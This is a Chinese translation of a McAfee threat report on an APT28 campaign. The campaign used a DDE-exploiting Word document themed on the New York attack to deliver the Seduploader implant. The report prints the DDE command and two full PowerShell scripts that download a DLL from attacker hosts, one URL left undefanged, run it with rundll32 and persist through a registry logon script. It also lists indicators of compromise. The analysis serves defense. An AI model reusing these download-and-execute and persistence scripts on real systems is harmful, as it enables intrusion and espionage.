> 原文链接: https://www.anquanke.com//post/id/87219 


# 【技术分享】黑客组织APT28利用DDE漏洞与纽约袭击事件发动攻击


                                阅读量   
                                **126129**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：mcafee.com
                                <br>原文地址：[https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/](https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t011f258d0149196a07.png)](https://p1.ssl.qhimg.com/t011f258d0149196a07.png)



译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：150RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

**前言**

在我们监控APT28威胁组织的攻击活动的过程中，McAfee Advanced Threat Research分析人员发现了一个恶意的Word文档，该文档似乎利用了我们之前报道过的Microsoft Office动态数据交换（DDE）技术。这个文件的发现，标志着APT28已经开始利用这种安全漏洞从事间谍活动。通过将PowerShell与DDE结合使用，攻击者就能够在受害者系统上执行任意代码，无论该系统是否启用了宏指令。

<br>

**样本详细分析**

APT28，又名Fancy Bear，最近开始利用各种不同的话题作为诱饵。就本例来说，它利用了纽约市最近发生的恐怖袭击事件。这次使用的文件本身虽然是空白的，不过一旦打开，它就会联系控制服务器，将恶意软件Seduploader第一个阶段的攻击代码投放到受害者的系统上。

在本案例中，用于传播Seduploader的域名创建于10月19日，它比创建Seduploader软件本身的日期还要早11天。

本案例中发现的诱饵文档的相关数据如下所示：

**文件名称：IsisAttackInNewYork.docx**

**Sha1：1c6c700ceebfbe799e115582665105caa03c5c9e**

**创建日期：2017-10-27T22:23:00Z**

该文档利用了Office产品中最近被曝光的DDE技术，该技术能够通过Windouws的命令行命令去执行PowerShell脚本，这实际上将运行两个命令。第一个命令如下所示：

```
C:ProgramsMicrosoftOfficeMSWord.exe........WindowsSystem32WindowsPowerShellv1.0powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(‘hxxp://netmediaresources[.]com/config.txt’);powershell -enc $e #.EXE
```

第二个PowerShell命令是经过了Base64编码的，它是从来自远程服务器的config.txt文件中找到的。解码之后，该命令如下所示：



```
$W=New-Object System.Net.WebClient;
$p=($Env:ALLUSERSPROFILE+”vms.dll”);
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = `{`$true`}`;
$W.DownloadFile(“hxxp://netmediaresources[.]com/media/resource/vms.dll “,$p);
if (Test-Path $p)`{`
$rd_p=$Env:SYSTEMROOT+”System32rundll32.exe”;
$p_a=$p+”,#1″;
$pr=Start-Process $rd_p -ArgumentList $p_a;
$p_bat=($Env:ALLUSERSPROFILE+”vms.bat”);
$text=’set inst_pck = “%ALLUSERSPROFILE%vms.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’
[io.File]::WriteAllText($p_bat,$text)
New-Item -Path ‘HKCU:Environment’ -Force | Out-Null;
New-ItemProperty -Path ‘HKCU:Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;
`}`
```

上面的PowerShell脚本会通过下面的URL来下载Seduploader：

```
hxxp://netmediaresources[.]com/media/resource/vms.dll
```

该Seduploader样本具有以下特征：

**文件名称：vms.dll**

**Sha1：4bc722a9b0492a50bd86a1341f02c74c0d773db7**

**编译时间：2017-10-31 20:11:10**

**控制服务器：webviewres[.]net**

<br>

**第一阶段**

文件将下载Seduploader第一阶段的侦察植入版本，它的作用是将受感染系统的基本主机信息提供给攻击者。如果该系统正好是攻击者感兴趣的目标，通常会进一步安装X-Agent或Sedreco。

根据各种公开的报告来看，APT28将Seduploader用于第一阶段的payload已经有些年头了。通过分析这次攻击活动中发现的最新payload的代码结构，我们发现，其与APT28以前使用的Seduploader样本完全吻合。

我们发现，这次攻击活动中的控制服务器的域名为webviewres[.]net，它与APT28过去的域名注册手法是非常一致的：伪装成一个看上去好像很正规的合法机构。 这个域名于10月25日注册，比payload和恶意文件的创建日期早了好几天。这个域名在10月29日首次激活，这个时间节点正好比这个版本的Seduploader的编译时间早了那么几天。 目前，该域名的IP地址为185.216.35.26，并托管在域名服务器ns1.njal.la和ns2.njal.la上面。

此外，McAfee的研究人员还发现了一个相关的样本，特征如下所示：

**文件名称：secnt.dll**

**Sha1: ab354807e687993fbeb1b325eb6e4ab38d428a1e**

**编译日期：2017-10-30 23:53:02**

**控制服务器：satellitedeluxpanorama[.]com. （该域名使用的域名服务器同上。）**

<br>

**第二阶段**

上面的样本很可能隶属于同一次入侵活动。根据我们的分析，它使用了相同的技术和payload。因此，我们可以断定，这次涉及DDE漏洞文档的攻击活动是从10月25日开始的。

其中，secnt.dll使用的域名satellitedeluxpanorama[.]com在11月5日被解析为89.34.111.160。恶意文档68c2809560c7623d2307d8797691abf3eafe319a负责投递Seduploader的payload（secnt.dll）。它的原始文件名是SabreGuardian2017.docx。这个文档是在10月27日创建的。该文档下载自hxxp://sendmevideo[.]org/SaberGuardian2017.docx。此外，该文件会调用sendmevideo[.]org/dh2025e/eh.dll来下载Seduploader（ab354807e687993fbeb1b325eb6e4ab38d428a1e）。

这个文档中嵌入的PowerShell命令如下所示：



```
$W=New-Object System.Net.WebClient;
$p=($Env:ALLUSERSPROFILE+”mvdrt.dll”);
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = `{`$true`}`;
$W.DownloadFile(“http://sendmevideo.org/dh2025e/eh.dll”,$p);
if (Test-Path $p)`{`
$rd_p=$Env:SYSTEMROOT+”System32rundll32.exe”;
$p_a=$p+”,#1″;
$pr=Start-Process $rd_p -ArgumentList $p_a;
$p_bat=($Env:ALLUSERSPROFILE+”mvdrt.bat”);
$text=’set inst_pck = “%ALLUSERSPROFILE%mvdrt.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’
[io.File]::WriteAllText($p_bat,$text)
New-Item -Path ‘HKCU:Environment’ -Force | Out-Null;
New-ItemProperty -Path ‘HKCU:Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;
`}`
```

文件vms.dll（4bc722a9b0492a50bd86a1341f02c74c0d773db7）与secnt.dll（ ab354807e687993fbeb1b325eb6e4ab38d428a1e）的相似度为99％，这表明其中的代码几乎完全相同，所以，它们极有可能都隶属于同一次攻击活动。换句话说，这两个DLL参与了这次攻击活动。此外，根据我们的代码分析结果来看，样本4bc722a9b0492a50bd86a1341f02c74c0d773db7与DLL植入物8a68f26d01372114f660e32ac4c9117e5d0577f1具有99％的相似度，而后者参与了以[Cy Con U.S](http://aci.cvent.com/events/2017-international-conference-on-cyber-conflict-cycon-u-s-/event-summary-004d598d31684f21ac82050a9000369f.aspx)网络安全会议为诱饵的攻击活动。

不过，这两次攻击活动中采用的攻击技术有所不同：以Cy Con U.S会议为诱饵的攻击活动，是通过文档文件来执行恶意的VBA脚本；而这次以恐怖袭击为诱饵的攻击活动，则使用文档文件中的DDE执行PowerShell脚本，并从分发站点远程获取payload。但是，这两次攻击活动所使用的payload却是相同的。

**<br>**

**小结**

APT28是一个实力雄厚的威胁组织，它不仅利用最近的热点事件来引诱潜在的受害者上钩，而且还能够迅速采用新的漏洞技术来增加其成功的可能性。由于Cycom U.S活动已经在媒体上曝光，所以APT28组织可能不再继续使用过去VBA脚本，转而通过DDE技术来绕过网络防御。最后，从APT28利用近期的国内事件和美国针对俄罗斯的军事演习这两点来看，APT28非常擅长利用地缘政治事件为诱饵来发动网络攻击。

**<br>**

**样本指标**

**SHA1哈希值**

ab354807e687993fbeb1b325eb6e4ab38d428a1e (vms.dll, Seduploader implant)

4bc722a9b0492a50bd86a1341f02c74c0d773db7 (secnt.dll, Seduploader implant)

1c6c700ceebfbe799e115582665105caa03c5c9e (IsisAttackInNewYork.docx)

68c2809560c7623d2307d8797691abf3eafe319a (SaberGuardian.docx)

**域名**

webviewres[.]net

netmediaresources[.]com

**IP地址**

185.216.35.26

89.34.111.160

**McAfee将其标记为RDN/Generic Downloader.x。**


